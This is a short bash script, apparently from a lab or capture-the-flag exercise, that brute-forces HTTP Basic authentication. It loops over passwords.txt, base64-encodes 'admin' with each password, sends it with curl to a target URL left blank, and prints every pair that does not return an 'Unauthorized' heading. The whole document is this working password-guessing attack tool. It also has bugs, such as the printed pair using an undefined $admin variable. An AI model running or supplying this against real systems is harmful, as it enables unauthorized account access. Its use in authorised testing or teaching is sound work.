#!/usr/bin/env bash

target=''
page=''
username='admin'
while IFS='' read password 
do
    og="$admin:$password"
    encoded=$(printf '%s:%s' "$username" "$password" | base64)
    clean=${encoded//=/}
    response=$(curl -s -L $target$page -H "Authorization: Basic $clean")
    auth=$(echo "$response" | grep "<h1>.*</h1>$" -o)
    if [[ "$auth" != '<h1>Unauthorized</h1>' ]]; then
        echo $og
    fi
done < passwords.txt
